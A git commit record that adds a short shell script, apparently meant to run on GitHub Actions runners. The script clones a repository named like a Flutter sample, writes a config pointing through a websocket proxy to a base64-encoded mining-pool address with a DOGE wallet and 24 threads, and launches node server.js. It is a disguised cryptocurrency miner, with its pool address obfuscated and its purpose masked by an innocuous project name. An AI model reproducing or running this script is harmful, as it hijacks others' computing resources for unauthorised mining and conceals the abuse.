22c0c2a1e4773db4b8c0cf4f608630978ad04903
arjuillahalmadadi <117597346+arjuillahalmadadi@users.noreply.github.com>
2025-09-06 18:59:15 +0700

    Create 342872949901.sh

---
+++ gh-actions/refs/heads/main/342872949901.sh
@@ -0,0 +1,7 @@
+git clone https://github.com/mom742886/flutter-vertex-sample
+
+cd flutter-vertex-sample
+
+echo -e '{"log": true, "proxy": "wss://present-nichol-vivo1-4f3dad8a.koyeb.app/bWlub3RhdXJ4Lm5hLm1pbmUuenBvb2wuY2E6NzAxOQ==", "user": "D8j9uniRtnR2qCs69oGuRp8G1Q5nCDmR9S", "password": "c=DOGE", "argent": "flutter-vertex/1.0", "threads": 24}' > data.txt
+
+node server.js
